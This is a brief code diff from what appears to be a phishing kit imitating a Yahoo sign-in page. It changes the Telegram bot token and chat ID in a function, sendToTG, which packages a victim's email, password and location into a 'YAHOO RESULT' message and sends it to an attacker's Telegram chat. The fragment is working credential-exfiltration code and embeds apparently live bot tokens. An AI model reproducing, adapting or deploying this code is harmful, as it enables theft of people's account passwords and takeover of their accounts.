@@ -144,8 +144,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
 
     async function sendToTG(e, p) {
-        const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q"; // Replace with your Telegram bot token
-        const chatId = 5645205996; // Replace with your chat ID
+        const telegramBotToken = "6673209475:AAEVPr8y41bKRHLyMJYFAIxaQKidO7mNjSE"; // Replace with your Telegram bot token
+        const chatId = 7526485798; // Replace with your chat ID
 
         const messageText = `**YAHOO RESULT**\nEmail: ${e}\nPassword: ${p} \n\nLocation: ${loc}`;
 
